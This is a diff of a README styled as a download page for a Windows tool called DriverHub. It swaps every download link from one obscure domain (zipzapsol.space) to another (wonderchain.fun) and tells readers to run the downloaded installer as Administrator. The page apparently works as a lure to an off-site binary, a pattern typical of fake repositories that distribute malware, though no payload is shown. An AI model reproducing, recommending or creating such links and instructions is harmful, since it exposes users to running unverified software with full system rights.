@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **DriverHub** for Windows.
 
 <p align="center">
-  <a href="https://driverhub.zipzapsol.space/">
+  <a href="https://driverhub.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-DriverHub-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download DriverHub">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[driverhub.zipzapsol.space](https://driverhub.zipzapsol.space/)** |
-| **Full URL** | `https://driverhub.zipzapsol.space/` |
+| **Direct link** | **[driverhub.wonderchain.fun](https://driverhub.wonderchain.fun/)** |
+| **Full URL** | `https://driverhub.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — driverhub.zipzapsol.space](https://driverhub.zipzapsol.space/)** (link above)
+1. Click **[Download — driverhub.wonderchain.fun](https://driverhub.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://driverhub.zipzapsol.space/"><strong>⬇ Download DriverHub now</strong></a></p>
+<p align="center"><a href="https://driverhub.wonderchain.fun/"><strong>⬇ Download DriverHub now</strong></a></p>
 
 ---
 
